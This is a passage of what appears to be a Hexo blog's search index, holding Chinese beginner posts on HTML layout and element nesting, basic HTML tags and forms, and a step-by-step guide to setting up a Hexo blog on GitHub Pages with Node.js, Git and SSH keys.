title="2.table布局"></a>2.table布局</h5><h5 id="3-iframe布局"><a href="#3-iframe布局" class="headerlink" title="3.iframe布局"></a>3.iframe布局</h5><p>作用：嵌套页面</p><pre><code class="html">百度一下：&lt;iframe src=&quot;http://www.baidu.com&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;</code></pre><h5 id="4-frameset布局"><a href="#4-frameset布局" class="headerlink" title="4.frameset布局"></a>4.frameset布局</h5><p>作用：管理后台页面</p><pre><code class="html">&lt;frameset rows=&quot;12%,88%&quot;&gt;    &lt;frame src=&quot;frame1.html&quot;&gt;    &lt;frameset cols=&quot;20%,80%&quot;&gt;        &lt;frame src=&quot;frame2.html&quot;&gt;        &lt;frame src=&quot;frame2.html&quot;&gt;    &lt;/frameset&gt;&lt;/frameset&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190424161425983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="9、嵌套规则"><a href="#9、嵌套规则" class="headerlink" title="9、嵌套规则"></a>9、嵌套规则</h4><p>块元素：独立成一行，可以设置宽高，默认宽高100%</p><ul><li>文字类块元素：<code>&lt;p&gt;    &lt;h1&gt;~&lt;h6&gt;</code></li><li>容器类块元素：<code>div  table tr td th from ul li ol dl dt dd</code></li></ul><p>行元素：不独立成一行，不可以   内容决定</p><ul><li><code>a  img input strong em del  span</code></li></ul><p>特殊字符：<code>文字 br  &amp;nbsp;</code></p><p>嵌套规则</p><h6 id="1-块元素可以嵌套行元素"><a href="#1-块元素可以嵌套行元素" class="headerlink" title="1.块元素可以嵌套行元素"></a>1.块元素可以嵌套行元素</h6><pre><code class="html">&lt;div&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/div&gt;</code></pre><h6 id="2-行元素可以嵌套行元素"><a href="#2-行元素可以嵌套行元素" class="headerlink" title="2.行元素可以嵌套行元素"></a>2.行元素可以嵌套行元素</h6><pre><code class="html">&lt;a href=&quot;&quot;&gt;&lt;strong&gt; a&lt;/strong&gt;&lt;/a&gt;</code></pre><h6 id="3-行元素不可以嵌套块元素"><a href="#3-行元素不可以嵌套块元素" class="headerlink" title="3.行元素不可以嵌套块元素"></a>3.行元素不可以嵌套块元素</h6><pre><code class="html">&lt;a href=&quot;&quot;&gt; &lt;div&gt;&lt;/div&gt; &lt;/a&gt;    &lt;!--错误--&gt;</code></pre><h6 id="4-文字类块元素不可以嵌套块元素"><a href="#4-文字类块元素不可以嵌套块元素" class="headerlink" title="4.文字类块元素不可以嵌套块元素"></a>4.文字类块元素不可以嵌套块元素</h6><pre><code class="html">&lt;p&gt;这是一&lt;p&gt;&lt;/p&gt;句话&lt;/p&gt;        &lt;!--错误--&gt;</code></pre><h6 id="5-容器类块元素可以嵌套块元素"><a href="#5-容器类块元素可以嵌套块元素" class="headerlink" title="5.容器类块元素可以嵌套块元素"></a>5.容器类块元素可以嵌套块元素</h6><pre><code class="html">&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt;</code></pre><p>以上便是我学习Web前端HTML部分的学习和练习记录，在总结练习过程中，我收益颇多。小白进阶ing，下一篇我将会把我学习Web前端CSS部分记录一下希望能再次丰富我对Web前端的理解和运用。</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web前端 </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github-Hexo简单搭建</title>
      <link href="/2019/03/17/Github-Hexo%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/03/17/Github-Hexo%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>这几天由于团队下发了一个任务，需要搭建一个github-hexo个人博客。<br>第一次听到这个任务，你是不是有点懵，反正当时的我是特别懵。由于从没有搭建过一些东西，想着是不是特别有趣？于是在浓厚好奇心的驱使下，我开启了自学模式，学习一些大佬的搭建经验和讲解。总算在不懈努力的学习下，幸运的成功无踩坑搭建了我的github-hexo<a href="http://qwzf.github.io">个人Blog</a>。由此，我写下这篇blog，希望能帮助大家无踩坑快速搭建自己的个人blog。</p><h3 id="一、准备搭建环境："><a href="#一、准备搭建环境：" class="headerlink" title="一、准备搭建环境："></a>一、准备搭建环境：</h3><h4 id="1-node-js的安装"><a href="#1-node-js的安装" class="headerlink" title="1.node.js的安装"></a>1.node.js的安装</h4><p>在浏览器上搜索node.js，进入官网。出现两个下载板块，LTS长期支持版，Current为当前最新版。我下载的是LTS版本的，此时是v10.15.3。<br><img src="http://img-blog.csdnimg.cn/20190908221001609.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt><br>nodejs里面的npm工具非常有用，可以在方便的安装一些插件。<br><a href="https://nodejs.org/en/" target="_blank" rel="noopener">下载地址</a><br>打开cmd命令行，成功页面如下</p><pre><code class="c">C:\Users\ASUS&gt;D:    //注意你安装的路径，我所有的文件都安装在D盘上了，也可以安装在其他路径D:\&gt;node -vv10.15.3D:\&gt;npm -v6.4.1</code></pre><h4 id="2-Git的安装"><a href="#2-Git的安装" class="headerlink" title="2.Git的安装"></a>2.Git的安装</h4><p>在浏览器上搜索git for windows，进入官网，点击Dawnload进行下载。但一般下载有点问题，需要翻墙下载。是不是有点担心，别着急，你也可以点击右边这个网址<a href="https://url.cn/5iYuHu8" target="_blank" rel="noopener">下载地址</a>下载，各种版本的都有哦！<br>安装步骤：一直next到下面这个页面<br><img src="http://img-blog.csdnimg.cn/20190908221011740.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt><br>选择第二个，然后一路next。打开cmd命令行，成功页面如下</p><pre><code class="c">C:\Users\ASUS&gt;D:D:\&gt;git versiongit version 2.21.0.windows.1</code></pre><h3 id="二、Hexo的安装"><a href="#二、Hexo的安装" class="headerlink" title="二、Hexo的安装"></a>二、Hexo的安装</h3><p>前面配置搭建环境，看起来是不是特简单。如果此时你认为搭建很简单的话，那你就想错了，从此时开始需要注意了，困难正一步一步向你袭来。<br><strong>创建文件夹，安装hexo</strong><br>先创建一个用来存放所有博客的东西的文件夹，并重命名，我为了容易记，创建了一个名为blog的文件夹。进入该文件夹目录，鼠标右击，选择Git Bash Here进入命令行。<br><img src="http://img-blog.csdnimg.cn/20190908221021182.jpg" alt><br>开始安装Hexo，<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">安装命令</a>：<code>npm install hexo-cli -g</code>安装结束后，成功命令如下</p><pre><code class="c">    C:\Users\ASUS&gt;D:    D:\&gt;cd blog    D:\blog&gt;hexo -v    hexo-cli: 1.1.0    os: Windows_NT 10.0.17134 win32 x64    http_parser: 2.8.0    node: 10.15.3    v8: 6.8.275.32-node.51    uv: 1.23.2    zlib: 1.2.11    ares: 1.15.0    modules: 64    nghttp2: 1.34.0    napi: 3    openssl: 1.1.0j    icu: 62.1    unicode: 11.0    cldr: 33.1    tz: 2018e</code></pre><p>然后初始化<br>初始化命令：<code>hexo init blog</code><br>初始化后打开，会出现下面这些文件：<br>　　node_modules：是依赖包<br>　　public：存放的是生成的页面<br>　　scaffolds：命令生成文章等的模板<br>　　source：用命令创建的各种文章<br>　　themes：主题<br>　　_config.yml：整个博客的配置信息<br>　　db.json：source解析所得到的<br>　　package.json：项目所需模块项目的配置信息<br>我可能操作有点问题，在blog目录下还有个qwzf文件夹，上述文件都在qwzf文件夹里，我记得我当时初始化的时候，执行的命令是<code>hexo init qwzf</code> 结果如下<br><img src="http://img-blog.csdnimg.cn/20190908221146538.jpg" alt></p><h3 id="三、Github的创建和配置"><a href="#三、Github的创建和配置" class="headerlink" title="三、Github的创建和配置"></a>三、Github的创建和配置</h3><h4 id="1-Github的创建"><a href="#1-Github的创建" class="headerlink" title="1.Github的创建"></a>1.Github的创建</h4><h5 id="（1）注册账号"><a href="#（1）注册账号" class="headerlink" title="（1）注册账号"></a>（1）注册账号</h5><p>GitHub是一个面向开源及私有软件项目的托管平台，在第一次使用github，需要进行注册。　　<a href="https://github.com/" target="_blank" rel="noopener">注册地址</a></p><h5 id="（2）初始设置"><a href="#（2）初始设置" class="headerlink" title="（2）初始设置"></a>（2）初始设置</h5><p>提交注册信息后，会弹出一个界面，这里我们选择免费用户就可以了。默认的FREE后面Chosen按钮已经是选中状态了。<br><img src="http://img-blog.csdnimg.cn/2019090822115860.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt></p><h5 id="（3）验证账号"><a href="#（3）验证账号" class="headerlink" title="（3）验证账号"></a>（3）验证账号</h5><p><strong>新建一个储存仓库</strong><br>名称为yourname.github.io, 其中yourname是你的github名称，按照这个规则创建才有用，我的是 qwzf.github.io<br><img src="http://img-blog.csdnimg.cn/20190908221208387.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt><br><strong>发现邮箱地址未验证</strong><br><img src="http://img-blog.csdnimg.cn/20190908221222937.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt><br><strong>登录注册时的邮箱，进行验证</strong></p><h4 id="2-新建仓库"><a href="#2-新建仓库" class="headerlink" title="2.新建仓库"></a>2.新建仓库</h4><p>在主页右上角，点击加号，找到New repository，点进去会显示如下界面，输入仓库名，点击创建<br><img src="http://img-blog.csdnimg.cn/20190908221236368.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt></p><h4 id="3-Github的配置"><a href="#3-Github的配置" class="headerlink" title="3.Github的配置"></a>3.Github的配置</h4><h5 id="（1）配置github账户信息"><a href="#（1）配置github账户信息" class="headerlink" title="（1）配置github账户信息"></a>（1）配置github账户信息</h5><p><strong>回到cmd中，配置github账户信息（YourName和YourEail都替换成你自己的）</strong></p><pre><code class="c">D:\blog\qwzf&gt;git config --global user.email &quot;YourEail&quot;  //配置用户邮箱，和注册github的邮箱一致D:\blog\qwzf&gt;git config --global user.name &quot;YourName&quot;  //配置用户名，和注册github的用户名一致</code></pre><h5 id="（2）生成SSH密钥"><a href="#（2）生成SSH密钥" class="headerlink" title="（2）生成SSH密钥"></a>（2）生成SSH密钥</h5><p>打开Git Bash Here命令行，输入<code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code>然后一直回车到结束，这样就成功在C盘用户个人目录生成了<code>.ssh文件夹</code><br><img src="http://img-blog.csdnimg.cn/20190908221247596.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt><br>打开.ssh文件夹，会出现两个文件，选择下方的那个文件，用记事本打开。会出现以下内容，全选复制<br><img src="http://img-blog.csdnimg.cn/20190908221312863.jpg" alt><br><strong>登录你的gihub账号，点击Your profile</strong><br><img src="http://img-blog.csdnimg.cn/20190908221323605.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt><br><strong>然后点击Edit profile进入，选择SSH并新建一个SSH Key</strong><br>其中Title中的名称可以任意填写，将C:\Users\Administrator.ssh目录下id_rsa.pub复制的所有内容粘贴到Key中，点击Add SSH Key，SSH密钥完成<br><img src="http://img-blog.csdnimg.cn/20190908221423685.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt><br>可以在gitbash中验证是否添加成功：<code>ssh -T git@github.com</code><br>问题：假如ssh-key配置失败，那么只要以下步骤就能完全解决</p><p>首先，清除所有的key-pair<br>ssh-add -D<br>rm -r ~/.ssh<br>删除你在github中的public-key</p><p>重新生成ssh密钥对<br>ssh-keygen -t rsa -C “<a href="mailto:xxx@xxx.com" target="_blank" rel="noopener">xxx@xxx.com</a>“</p><p>接下来正常操作<br>在github上添加公钥public-key:<br>1、首先在你的终端运行 xclip -sel c ~/.ssh/id_rsa.pub将公钥内容复制到剪切板<br>2、在github上添加公钥时，直接复制即可<br>3、保存</p><p>测试：<br>在终端 ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a></p><h3 id="四、-config-yml文件的配置"><a href="#四、-config-yml文件的配置" class="headerlink" title="四、_config.yml文件的配置"></a>四、_config.yml文件的配置</h3><p>看到上面的过程，是不是感到一些厌烦，别着急哦，到这一步，就离成功搭建，只剩一步之遥了。<br>用编辑器（我用的sublime Text）打开你的blog项目，修改_config.yml文件的一些配置:</p><pre><code class="c">url: https://qwzf.github.io</code></pre><pre><code class="php">deploy:  type: git  repo: https://github.com/qwzf/qwzf.github.io.git  branch: master</code></pre><p><strong>将qwzf换成你自己的用户名</strong></p><h3 id="五、本地预览和上传到Github"><a href="#五、本地预览和上传到Github" class="headerlink" title="五、本地预览和上传到Github"></a>五、本地预览和上传到Github</h3><h4 id="（1）本地预览"><a href="#（1）本地预览" class="headerlink" title="（1）本地预览"></a>（1）本地预览</h4><p>回到gitbash中，进入你的blog目录，分别执行以下命令：</p><pre><code class="hexo">hexo cleanhexo generatehexo server</code></pre><p>命令也可以简写成</p><pre><code class="c">hexo cleanhexo ghexo s   </code></pre><p>声明：hexo 3.0把服务器独立成单个模块，需要单独安装：<code>npm i hexo-server</code><br>打开浏览器输入：<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 就可以在本地看到Hexo了<br>是不是有点兴奋，完成下面最后一步，就可以部署到github上喽！</p><h4 id="（2）上传到Github"><a href="#（2）上传到Github" class="headerlink" title="（2）上传到Github"></a>（2）上传到Github</h4><p>先安装：<code>npm install hexo-deployer-git –save</code><br>（这样能将你写的文章部署到github服务器上并让别人浏览到）<br>执行命令(建议每次都按照如下步骤部署)：</p><pre><code class="c">hexo clean   //清理缓存hexo generate  //本地生成hexo deploy   //提交到服务器</code></pre><p>命令也可以简写成</p><pre><code class="c">hexo cleanhexo ghexo d</code></pre><p>注：deploy的过程中要输入你的username及passward<br>然后在浏览器中输入<a href="http://yourgithubname.github.io就可以看到你的个人博客啦。" target="_blank" rel="noopener">http://yourgithubname.github.io就可以看到你的个人博客啦。</a><br><code>感觉gitbash中东西太多的时候输入clear命令清空</code><br>命令简写<br>hexo n “我的博客” == hexo new “我的博客” #新建文章<br>hexo g == hexo generate #生成<br>hexo s == hexo server #启动服务预览<br>hexo d == hexo deploy #部署</p><p>hexo server #Hexo会监视文件变动并自动更新，无须重启服务器<br>hexo server -s #静态模式<br>hexo server -p 5000 #更改端口<br>hexo server -i 192.168.1.1 #自定义 IP<br>hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</p><h3 id="六、修改及配置主题"><a href="#六、修改及配置主题" class="headerlink" title="六、修改及配置主题"></a>六、修改及配置主题</h3><p>hexo初始化之后默认的主题是landscape , 然后你可以去这个　<a href="https://hexo.io/themes/" target="_blank" rel="noopener">地址</a>　里面找到你想要的主题，进行克隆。都有相关的介绍，next比较充分，但我觉得不太美观，就自己挑选了个精美主题进行配置修改，按着说明来就好了，反正一直改就完了！挑选结束后，可以将主题copy到themes目录，如</p><pre><code class="c">git clone https://github.com/HmyBmny/hexo-theme-concise.git themes/concise </code></pre><p>修改_config.yml中的theme：</p><pre><code>theme: concise</code></pre><p>所有的主题模板，共有的操作方式就只有这两个，但是不同的模板，会有很多不同的设置，这里就需要针对模板的使用说明进行修改了。建议通过github找到模板，看下readme。我觉的这个大佬的主题修改和配置可能会有点帮助， <a href="https://www.jianshu.com/p/df19bb51c6ea?utm_campaign=maleskine" target="_blank" rel="noopener">链接地址</a></p><p>这便是我搭建Github-Hexo的过程，希望能用这篇blog，让大家少入坑，成功搭建属于自己的个人博客。教程千万条，避坑第一条。搭建不规范，入坑更容易。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Github </tag>
            
            <tag> Hexo搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超文本标记语言html</title>
      <link href="/2019/03/15/html%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B8%80/"/>
      <url>/2019/03/15/html%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>超级文本标记语言是标准通用标记语言下的一个应用，也是一种规范，一种标准，它通过标记符号来标记要显示的网页中的各个部分。但需要注意的是，对于不同的浏览器，对同一标记符可能会有不完全相同的解释，因而可能会有不同的显示效果。下面是我学习html前半部分后作出的简单总结以及一些练习实例，鄙人才疏学浅，敬请大佬指正。</p><h2 id="1、html基本格式"><a href="#1、html基本格式" class="headerlink" title="1、html基本格式"></a>1、html基本格式</h2><pre><code class="html">    &lt;!DOCTYPE html&gt;                    &lt;!--声明文档解析类型--&gt;    &lt;html&gt;                            &lt;!--根标签（开始）--&gt;    ​    &lt;head&gt;                        &lt;!--头标签（开始）--&gt;    ​        &lt;title&gt;html基本结构&lt;/title&gt; &lt;!-- 整个页面标题 --&gt;    ​    &lt;/head&gt;                        &lt;!--头标签（结束）--&gt;    &lt;body&gt;                            &lt;!--主体标签（开始）--&gt;    ​    &lt;!--代码要缩进--&gt;    ​    &lt;h1&gt;我的第一个标题&lt;/h1&gt;        &lt;!--主题内容中的标题--&gt;    ​    &lt;p&gt;我的第一个段落&lt;/p&gt;        &lt;!--页面内容--&gt;    &lt;/body&gt;                            &lt;!--主体标签（结束）--&gt;    &lt;/html&gt;                            &lt;!--根标签（结束）--&gt;</code></pre><h2 id="2、html标签"><a href="#2、html标签" class="headerlink" title="2、html标签"></a>2、html标签</h2><p>单标签：<code>&lt;br /&gt;</code><br>双标签：&lt;标签名&gt;&lt;/标签名&gt;</p><h2 id="3、html属性"><a href="#3、html属性" class="headerlink" title="3、html属性"></a>3、html属性</h2><p>定义：用来完成对受控文字的某些特殊效果或功能。<br>html属性分为：属性名和属性值。</p><p>==属性名=属性值== 中间使用=分隔 属性值写在引号（单引号或双引号）里面。</p><pre><code class="html">     &lt;a href=&quot;https://www.baidu.com/&quot;&gt;百度一下&lt;/a&gt;</code></pre><p>html除了现有属性，还有自定义属性：</p><pre><code class="html">    &lt;a href=&quot;https://www.baidu.com/&quot; data-wm=&quot;pdsu.cn&quot;&gt;百度一下&lt;/a&gt;</code></pre><p>属性名在html5里面加<code>data-</code>作为前缀后接一个或多个字母，属性值随便写，自定义属性默认不会对页面展示造成任何影响。</p><h2 id="4、html元素"><a href="#4、html元素" class="headerlink" title="4、html元素"></a>4、html元素</h2><p>定义：从开始标签到结束标签所有代码。<br>html元素内容：从开始标签到结束标签之间的内容。<br>html元素分为：块级元素和内联元素<br><strong>块级元素：占页面整行长度  <code>&lt;div&gt;&lt;/div&gt;</code></strong><br><strong>内联元素：只占元素内容长度</strong></p><pre><code>&lt;span&gt;&lt;/span&gt;</code></pre><h2 id="5、html注释"><a href="#5、html注释" class="headerlink" title="5、html注释"></a>5、html注释</h2><pre><code class="html">    &lt;!-- 被注释的内容 --&gt;</code></pre><p>为了给写代码的人看的。</p><h2 id="6、html编码"><a href="#6、html编码" class="headerlink" title="6、html编码"></a>6、html编码</h2><p>非数字的进行编码。</p><p><strong>（1）设置html文档所在文件编码<br>（2）在html文档中用标签指定浏览器使用某编码进行展示网页（指定与<br>html文件的编码相对应的编码即可)</strong></p><p>==文件编码为utf-8在html中标签指定utf-8编码展示网页==<br> ==文件编码为ansi在html中标签指定jb2312编码展示网页==<br>常用编码：utf-8或jb2312</p><pre><code class="html">    &lt;head&gt;    &lt;!-- 声明：utf-8国际编码 gbk jb2312中文编码 --&gt;    &lt;meta charset=&quot;utf-8&quot; /&gt;    &lt;title&gt;页面标题&lt;/title&gt;    &lt;/head&gt;</code></pre><h2 id="7、html常用标签"><a href="#7、html常用标签" class="headerlink" title="7、html常用标签"></a>7、html常用标签</h2><h3 id="1、水平线"><a href="#1、水平线" class="headerlink" title="1、水平线"></a>1、水平线</h3><p>单纯水平线：<code>&lt;hr /&gt;</code>      类型：单标签</p><h3 id="2、主题内容中的标题"><a href="#2、主题内容中的标题" class="headerlink" title="2、主题内容中的标题"></a>2、主题内容中的标题</h3><pre><code class="html">    &lt;h1&gt;&lt;/h1&gt;        &lt;!--一级标题--&gt;    &lt;h2&gt;&lt;/h2&gt;        &lt;!--二级标题--&gt;    &lt;h3&gt;&lt;/h3&gt;        &lt;!--三级标题--&gt;    &lt;h4&gt;&lt;/h4&gt;        &lt;!--四级标题--&gt;    &lt;h5&gt;&lt;/h5&gt;        &lt;!--五级标题--&gt;    &lt;h6&gt;&lt;/h6&gt;        &lt;!--六级标题--&gt;</code></pre><p>类型：双标签</p><h3 id="3、段落"><a href="#3、段落" class="headerlink" title="3、段落"></a>3、段落</h3><p><code>&lt;p&gt;&lt;/p&gt;</code>     类型：双标签</p><h3 id="4、换行"><a href="#4、换行" class="headerlink" title="4、换行"></a>4、换行</h3><p><code>&lt;br /&gt;</code> 类型：单标签</p><h3 id="5、空格"><a href="#5、空格" class="headerlink" title="5、空格"></a>5、空格</h3><p>（1）<code>&amp;nbsp</code>  不是标签，可以当做特殊字符。</p><p>（2）输入法用全角</p><h3 id="6、无序列表"><a href="#6、无序列表" class="headerlink" title="6、无序列表"></a>6、无序列表</h3><pre><code class="html">    &lt;!-- 列表需要嵌套写法 --&gt;    &lt;ul&gt;    ​    &lt;li&gt;&lt;/li&gt;    ​    &lt;li&gt;&lt;/li&gt;    &lt;/ul&gt;</code></pre><h3 id="7、有序列表"><a href="#7、有序列表" class="headerlink" title="7、有序列表"></a>7、有序列表</h3><pre><code class="html">    &lt;ol&gt;    ​    &lt;li&gt;&lt;/li&gt;    ​    &lt;li&gt;&lt;/li&gt;    &lt;/ol&gt;</code></pre><p><em>子元素，父元素，后代元素，兄弟元素</em></p><h3 id="8、定义列表"><a href="#8、定义列表" class="headerlink" title="8、定义列表"></a>8、定义列表</h3><pre><code class="html">    &lt;dl&gt;    ​    &lt;dt&gt;&lt;/dt&gt;    ​    &lt;dd&gt;    ​    &lt;/dd&gt;        &lt;/dl&gt;</code></pre><p>类型：块级元素</p><h3 id="9、插入图片"><a href="#9、插入图片" class="headerlink" title="9、插入图片"></a>9、插入图片</h3><pre><code class="html">    &lt;img src=&quot;&quot; alt=&quot;&quot; width=&quot;&quot; height=&quot;&quot; /&gt;</code></pre><p>属性src里填图片路径<br>图片路径分为：绝对路径和相对路径<code>&lt;!--相对路径：相对于当前html文件路径--&gt;</code></p><p>==./当前目录../上一级目录==<br>==在当前目录建一个文件夹：images    将所展示图片都放在里面==</p><p>属性alt里填图片说明<br>属性width里填图片长度：也可以用百分比表示<br>属性height里填图片高度：也可以用百分比表示<br>类型：内联元素<br>实例</p><pre><code class="html">    &lt;img src=&quot;images/1.jpg&quot; alt=&quot;二哈&quot; width=&quot;200&quot; height=&quot;100&quot;/&gt;</code></pre><h3 id="10、超链接"><a href="#10、超链接" class="headerlink" title="10、超链接"></a>10、超链接</h3><pre><code class="html">    &lt;a href=&quot;https://www.baidu.com/&quot; title=&quot;鼠标悬停显示&quot; target=&quot;_blank&quot;&gt;百度一下&lt;/a&gt;</code></pre><p>属性href：需要连接的网址，网站建设初期用#链接表示空链接</p><p>属性title：鼠标悬停显示</p><p>属性target：设置_blank，在新窗口打开链接地址</p><p>类型：内联元素</p><h3 id="11、指定图片某块区域加超链接"><a href="#11、指定图片某块区域加超链接" class="headerlink" title="11、指定图片某块区域加超链接"></a>11、指定图片某块区域加超链接</h3><p>（1）为map标签加上id属性，定义一个唯一属性<br>（2）为保证兼容性加name属性，属性值与id值相同<br>（3）为map标签所作用图片img标签加usemap属性，属性名为#id名称<br>（4）在map标签内嵌套area标签实现给指定区域加链接</p><pre><code class="html">    &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot; /&gt;</code></pre><p>属性shape：定义链接区域形状，常用值rect（矩形）circle（圆形）<br>属性coords：确定区域精确位置，填坐标<code>&lt;!--以左上角为原点--&gt;</code><br>属性href：链接地址<br>属性alt：链接说明</p><h3 id="12、link标签"><a href="#12、link标签" class="headerlink" title="12、link标签"></a>12、link标签</h3><p>放置在头标签head内的用于链接外部css文件、链接收藏夹图标（favicon.ico）<br>最常见用途：链接外部样式表</p><p>属性href 值为外部资源地址，这里是css地址<br>属性rel 定义当前文档与被链接文档之间关系，值为icon、stylesheet、next、help、author、alternate、licence、search、tag、prev、sidebar<br>这里是外部css样式 即stylesheet<br>属性type 规定被链接文档MIME类，值为text/css </p><h3 id="13、div容器"><a href="#13、div容器" class="headerlink" title="13、div容器"></a>13、div容器</h3><p>div标签可以看成存放标签的容器     类型：块级元素</p><h3 id="14、span内联元素"><a href="#14、span内联元素" class="headerlink" title="14、span内联元素"></a>14、span内联元素</h3><p>组合内联元素，以便css美化</p><h3 id="15、表格"><a href="#15、表格" class="headerlink" title="15、表格"></a>15、表格</h3><p>实例</p><pre><code class="html">    &lt;table border=&quot;1&quot; cellpadding=&quot;2&quot; cellspacing=&quot;1&quot;&gt;    ​    &lt;tr&gt;    ​        &lt;th&gt;姓名&lt;/th&gt;    ​        &lt;th&gt;学号&lt;/th&gt;    ​        &lt;th&gt;年龄&lt;/th&gt;    ​        &lt;th&gt;成绩&lt;/th&gt;    ​    &lt;/tr&gt;    ​    &lt;tr&gt;    ​        &lt;td&gt;小王&lt;/td&gt;    ​        &lt;td&gt;133&lt;/td&gt;    ​        &lt;td&gt;19&lt;/td&gt;    ​        &lt;td&gt;100&lt;/td&gt;    ​    &lt;/tr&gt;    &lt;/table&gt;</code></pre><p>table标签<br>属性：border    作用：规定表格边框宽度<br>属性：cellpadding    作用：规定文字和边框的间距<br>属性：cellspacing     作用：规定每个单元格边框宽度<br>tr标签：html表格中的行<br>th标签：表格内表头单元格<br>td标签：表格内普通单元格<br>常用属性：<br>colspan：规定单元格可横跨列数，值为数字<br>rowspan：规定单元格可横跨行数，值为数字</p><h3 id="16、表单"><a href="#16、表单" class="headerlink" title="16、表单"></a>16、表单</h3><h4 id="表单提交实例1"><a href="#表单提交实例1" class="headerlink" title="表单提交实例1"></a>表单提交实例1</h4><pre><code class="html">    &lt;!DOCTYPE html&gt;    &lt;html&gt;        &lt;head&gt;            &lt;meta charset=&quot;utf-8&quot; /&gt;            &lt;title&gt;html表单提交&lt;/title&gt;        &lt;/head&gt;     &lt;body&gt;         &lt;h1&gt;账户登录&lt;/h1&gt;        &lt;form name=&quot;submit&quot; action=&quot;https://www.baidu.com/&quot; target=&quot;_blank&quot; method=&quot;get&quot;&gt;            &lt;!-- 由于表单提交需要进行数据处理，html语言无法实现，暂且写成向百度提交数据 --&gt;            账号：&lt;input name=&quot;text&quot; type=&quot;text&quot; size=&quot;20&quot; /&gt;            &lt;br /&gt;            密码：&lt;input name=&quot;password&quot; type=&quot;password&quot; size=&quot;20&quot; /&gt;            &lt;br /&gt;            &lt;input type=&quot;submit&quot; value=&quot;确认登录&quot; /&gt;                                             &amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp           &amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp            &lt;input type=&quot;reset&quot; value=&quot;清空&quot; /&gt;        &lt;/form&gt;    &lt;/body&gt;        &lt;/html&gt; </code></pre><h4 id="1、标签-lt-form-gt-：定义供用户输入的html表单"><a href="#1、标签-lt-form-gt-：定义供用户输入的html表单" class="headerlink" title="1、标签&lt;form&gt;：定义供用户输入的html表单"></a>1、标签<code>&lt;form&gt;</code>：定义供用户输入的html表单</h4><p>属性：<br>action：规定提交表单向何处发送表单数据<br>name：表单命名<br>target：_blank在新窗口打开<br>method：提交方式，get或post值<br>类型：双标签</p><h4 id="2、-lt-input-gt-标签-定义表单输入页面"><a href="#2、-lt-input-gt-标签-定义表单输入页面" class="headerlink" title="2、&lt;input&gt;标签:定义表单输入页面"></a>2、<code>&lt;input&gt;</code>标签:定义表单输入页面</h4><pre><code>&lt;!-- 通过type属性展示不同输入页面，通过value改变默认值 --&gt;</code></pre><h5 id="（1）普通文本框："><a href="#（1）普通文本框：" class="headerlink" title="（1）普通文本框："></a>（1）普通文本框：</h5><pre><code class="html">    &lt;input type=&quot;text&quot; /&gt;</code></pre><h5 id="（2）密码框："><a href="#（2）密码框：" class="headerlink" title="（2）密码框："></a>（2）密码框：</h5><pre><code class="html">    &lt;input type=&quot;password&quot; /&gt;</code></pre><h5 